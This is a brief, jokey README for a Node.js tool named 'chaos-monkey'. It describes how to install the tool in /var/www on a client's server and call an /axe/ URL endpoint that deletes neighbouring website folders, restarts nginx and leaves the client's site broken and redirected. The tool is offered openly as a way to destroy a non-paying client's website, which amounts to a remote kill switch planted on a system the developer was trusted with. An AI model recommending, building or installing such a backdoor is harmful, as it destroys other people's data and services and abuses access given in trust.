# Chaos Monkey

Have you ever wanted a quick way to delete your non-paying client’s website 
with a simple URL?

Use like:

    $ cd /var/www
    $ git clone https://github.com/nerdfiles/chaos-monkey/
    $ cd chaos-monkey
    $ npm install && npm install -g forever
    $ forever start index.js

Now you can get an endpoint:

    $ open http://{{ip}}:{{port}}/axe/{{toBeDeleted}}

Such that any common folder at the same place as `chaos-monkey` will be 
deleted.

## Expected Results

1. Client doesn’t pay. *snaps fingers*
2. Hit the common folder endpoint.
3. App is deleted, `nginx` server is restarted.
4. App shows a Critical Error!
5. Client scrambles for a fix, finds a dev to remove the proxy.
6. Client sees that site now redirects to [dowebsitesneedtolookexactlythesameineverybrowser.com](http://dowebsitesneedtolookexactlythesameineverybrowser.com/).
7. Nobody wins.
